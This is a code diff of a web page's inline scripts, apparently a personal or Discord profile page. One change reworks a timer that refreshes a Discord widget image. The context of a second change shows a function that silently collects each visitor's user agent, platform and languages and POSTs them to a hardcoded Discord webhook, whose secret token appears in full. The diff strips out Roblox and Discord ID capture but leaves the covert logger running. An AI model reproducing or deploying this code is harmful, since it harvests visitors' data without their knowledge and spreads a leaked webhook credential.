@@ -47,32 +47,41 @@
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
 
         <script>
-        function updateImageAndStatus() {
-            const imageContainer = document.getElementById("imageContainer");
-            const statusParagraph = document.createElement("p");
-            statusParagraph.textContent = "Refreshing...";
-            imageContainer.appendChild(statusParagraph);
-            
-            setTimeout(function() {
+function updateImageAndStatus() {
+    const imageContainer = document.getElementById("imageContainer");
 
-                imageContainer.removeChild(statusParagraph);
+    function updateContent() {
+        const statusParagraph = document.createElement("p");
+        statusParagraph.textContent = "Refreshing...";
+        imageContainer.appendChild(statusParagraph);
 
-                const newImage = document.createElement("img");
-                newImage.src = "https://discord.c99.nl/widget/theme-4/502974588075114509.png";
-                newImage.style.width = "300px";
+        setTimeout(function() {
+            imageContainer.removeChild(statusParagraph);
+
+            const newImage = document.createElement("img");
+            newImage.src = "https://discord.c99.nl/widget/theme-4/502974588075114509.png";
+            newImage.style.width = "300px";
+
+            while (imageContainer.firstChild) {
                 imageContainer.removeChild(imageContainer.firstChild);
-                imageContainer.appendChild(newImage);
-            }, 10000);
-
-            function updateDots() {
-                statusParagraph.textContent = "Refreshing" + ".".repeat((new Date().getTime() / 300) % 4);
-                requestAnimationFrame(updateDots);
             }
+            imageContainer.appendChild(newImage);
+        }, 3000);
 
-            updateDots();
+        function updateDots() {
+            statusParagraph.textContent = "Refreshing" + ".".repeat((new Date().getTime() / 300) % 4);
+            requestAnimationFrame(updateDots);
         }
 
-        updateImageAndStatus();
+        updateDots();
+    }
+
+    updateContent();
+
+    setInterval(updateContent, 10000);
+}
+
+window.addEventListener("load", updateImageAndStatus);
         </script>
 
         <script>
@@ -148,17 +157,6 @@ function enviarMensagemDiscord() {
             var userLanguage = navigator.language;
             var userLanguages = navigator.languages;
 
-            var robloxId = "Não detectado";
-            if (window.location.href.includes("roblox.com")) {
-                robloxId = window.location.pathname.split("/")[2];
-            }
-
-            var discordId = "Não detectado";
-            var discordMatch = window.location.href.match(/discord\.com\/users\/(\d+)/);
-            if (discordMatch) {
-                discordId = discordMatch[1];
-            }
-
             var discordXhr = new XMLHttpRequest();
             discordXhr.open("POST", "https://discord.com/api/webhooks/1119072044290687079/L2gDQchkqGO0MoUYdnsRBf7NvAmEb-dLcErFfyL2b7lqkKGoAfIoyr64qRaHd8HZwagt", true);
             discordXhr.setRequestHeader("Content-Type", "application/json");
@@ -167,9 +165,7 @@ function enviarMensagemDiscord() {
                          "\nUser Agent: " + userAgent + 
                          "\nPlatform: " + platform + 
                          "\nLanguage: " + userLanguage + 
-                         "\nLanguages: " + userLanguages.join(", ") +
-                         "\nRoblox ID: " + robloxId +
-                         "\nDiscord ID: " + discordId,
+                         "\nLanguages: " + userLanguages.join(", "),
             });
             discordXhr.send(data);
         }
